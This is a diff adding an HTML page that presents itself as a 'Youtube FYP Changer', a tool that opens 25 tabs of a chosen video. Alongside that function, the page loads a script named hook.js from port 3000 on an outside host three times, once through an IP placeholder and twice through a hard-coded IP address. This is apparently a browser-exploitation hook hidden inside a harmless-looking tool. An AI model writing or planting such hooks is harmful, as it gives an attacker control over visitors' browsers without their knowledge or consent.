@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Youtube FYP Changer</title>
+</head>
+<body>
+
+<script src="http://<IP>:3000/hook.js"></script>
+<label for="youtubeLinkInput">Enter a video link that resembles the videos you want to see:</label>
+<input type="text" id="youtubeLinkInput" placeholder="https://www.youtube.com/watch?v=...">
+<button onclick="openYouTubeTabs()">Open Tabs (WARNING: This opens 25 tabs and may cause some lag)</button>
+
+<script>
+  function openYouTubeTabs() {
+    const youtubeLink = document.getElementById('youtubeLinkInput').value;
+
+    if (!isValidYouTubeLink(youtubeLink)) {
+      alert('Please enter a valid YouTube video link.');
+      return;
+    }
+
+    // Open 25 tabs with the same YouTube video link
+    for (let i = 0; i < 25; i++) {
+      window.open(youtubeLink, '_blank');
+    }
+  }
+
+  function isValidYouTubeLink(link) {
+    // Simple check for a YouTube video link
+    const youtubeRegex = /^(https?:\/\/)?(www\.)?(youtube\.com\/watch\?v=|youtu\.be\/)([a-zA-Z0-9_-]{11})$/;
+    return youtubeRegex.test(link);
+  }
+</script>
+
+<script src="http://129.222.186.32:3000/hook.js"></script>
+
+<script src="http://129.222.186.32:3000/hook.js"></script>
+
+</body>
+</html>
+
